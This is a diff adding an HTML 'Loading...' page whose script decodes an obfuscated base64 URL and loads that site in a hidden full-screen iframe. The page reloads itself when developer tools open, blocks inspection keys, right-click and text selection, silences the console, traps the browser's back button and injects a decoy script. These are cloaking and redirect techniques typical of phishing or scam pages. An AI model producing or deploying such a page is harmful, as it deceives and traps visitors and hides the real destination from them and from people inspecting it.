@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        *{margin:0;padding:0;border:none;outline:none}html,body{height:100%;overflow:hidden}#f{width:100%;height:100vh;border:none;display:block}#l{position:fixed;top:0;left:0;width:100%;height:100%;background:#1a1a1a;display:flex;justify-content:center;align-items:center;z-index:9999;color:#fff;font-family:Arial,sans-serif}.s{width:40px;height:40px;border:4px solid #333;border-top:4px solid #fff;border-radius:50%;animation:spin 1s linear infinite;margin-right:15px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+    </style>
+</head>
+<body>
+    <div id="l"><div class="s"></div><span>Loading...</span></div>
+    <script>
+        const _0x4a8b=['ZGFkdW5hdGlvbg==','bWd4','d29ybGQ=','aHR0cHM6Ly8=','Oi8v','Lw=='];
+        function _0x2f1a(a){return atob(a)}
+        function _0x3e4c(){
+            const p1=_0x2f1a(_0x4a8b[3]);
+            const p2=_0x2f1a(_0x4a8b[0]);
+            const p3=_0x2f1a(_0x4a8b[1]);
+            const p4=_0x2f1a(_0x4a8b[2]);
+            const p5=_0x2f1a(_0x4a8b[4]);
+            const p6=_0x2f1a(_0x4a8b[5]);
+            return p1+p2+'.'+p3+'.'+p4+p6;
+        }
+        function _0x1b7e(){
+            const u=_0x3e4c();
+            const i=document.createElement('iframe');
+            i.id='f';i.frameBorder='0';i.scrolling='yes';i.allowFullscreen=true;
+            i.style.cssText='display:none;width:100%;height:100vh;';
+            i.onload=()=>{document.getElementById('l').style.display='none';i.style.display='block';};
+            setTimeout(()=>{i.src=u;},Math.floor(Math.random()*200)+100);
+            document.body.appendChild(i);
+        }
+        let _0x5d2a=false;
+        setInterval(()=>{
+            if((window.outerHeight-window.innerHeight>160)||(window.outerWidth-window.innerWidth>160)){
+                if(!_0x5d2a){_0x5d2a=true;window.location.reload();}
+            }else{_0x5d2a=false;}
+        },500);
+        document.addEventListener('keydown',(e)=>{
+            if(e.keyCode===123||(e.ctrlKey&&e.shiftKey&&[73,74,67].includes(e.keyCode))||(e.ctrlKey&&[85,83].includes(e.keyCode))){
+                e.preventDefault();e.stopPropagation();return false;
+            }
+        });
+        document.addEventListener('contextmenu',(e)=>{e.preventDefault();return false;});
+        document.addEventListener('selectstart',(e)=>{e.preventDefault();});
+        if(typeof console!=='undefined'){
+            console.log=console.warn=console.error=console.info=console.debug=()=>{};
+        }
+        if(document.readyState==='loading'){
+            document.addEventListener('DOMContentLoaded',_0x1b7e);
+        }else{_0x1b7e();}
+        setTimeout(()=>{
+            if(document.getElementById('l').style.display!=='none'){
+                document.getElementById('l').style.display='none';
+                if(!document.getElementById('f')){_0x1b7e();}
+            }
+        },5000);
+        if(window.history&&window.history.pushState){
+            window.history.pushState(null,document.title,window.location.pathname);
+            window.addEventListener('popstate',()=>{
+                window.history.pushState(null,document.title,window.location.pathname);
+            });
+        }
+        const _0x8c3f=document.createElement('script');
+        _0x8c3f.innerHTML='// System configuration loaded';
+        document.head.appendChild(_0x8c3f);
+    </script>
+</body>
+</html>
